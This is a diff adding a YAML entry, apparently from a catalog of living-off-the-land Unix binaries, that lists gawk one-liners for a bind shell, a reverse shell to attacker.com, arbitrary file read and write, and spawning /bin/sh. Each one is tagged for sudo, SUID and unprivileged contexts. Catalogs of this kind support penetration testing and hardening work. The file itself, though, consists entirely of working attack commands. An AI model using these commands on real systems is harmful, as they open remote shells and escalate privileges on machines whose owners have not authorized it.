@@ -1,0 +1,51 @@
+---
+functions:
+  bind-shell:
+  - code: |-
+      gawk 'BEGIN {
+          s = "/inet/tcp/12345/0/0";
+          while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+          while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+    connector: tcp-client
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    tty: false
+  file-read:
+  - code: |-
+      gawk '//' /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      gawk 'BEGIN {
+          s = "/inet/tcp/0/attacker.com/12345";
+          while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+          while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    listener: tcp-server
+    tty: false
+  shell:
+  - code: |-
+      gawk 'BEGIN {system("/bin/sh")}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
